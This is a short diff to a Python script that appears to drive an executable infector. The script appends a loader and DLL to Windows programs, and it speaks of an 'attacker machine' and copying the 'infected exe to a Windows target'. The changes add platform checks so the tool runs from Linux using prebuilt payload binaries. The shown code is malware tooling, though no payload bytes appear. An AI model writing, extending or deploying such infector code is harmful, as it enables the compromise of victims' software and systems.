@@ -227,6 +227,12 @@ def ensure_build():
     if os.path.isfile(LOADER) and os.path.isfile(DLL):
         log("[+] binaries already compiled")
         return True
+    if sys.platform != "win32":
+        # MSVC + build.bat are Windows-only: on Linux the attacker machine uses the
+        # prebuilt binaries shipped in bin/ (infection itself is a byte append)
+        log("[-] no prebuilt binaries in bin/ and compilation needs Windows (MSVC)")
+        log("    copy bin/loader.exe + bin/ckdll.dll from a Windows build machine")
+        return False
     if not os.path.isfile(BUILD):
         log("[-] build.bat not found")
         return False
@@ -484,6 +490,9 @@ def run_infected_locally(host_path, infected_path, is_folder=False):
     For standalone exe: copy infected over original, run, wait, restore.
     For folder exe: just run from ifec/folds/ (the folder copy is self-contained).
     """
+    if sys.platform != "win32":
+        log("[-] --run executes the infected PE: Windows-only. Copy the infected exe to a Windows target.")
+        return
     if is_folder:
         # Folder mode: the infected exe is already in ifec/folds/<name>/
         # with all its dependencies. Just run it directly.
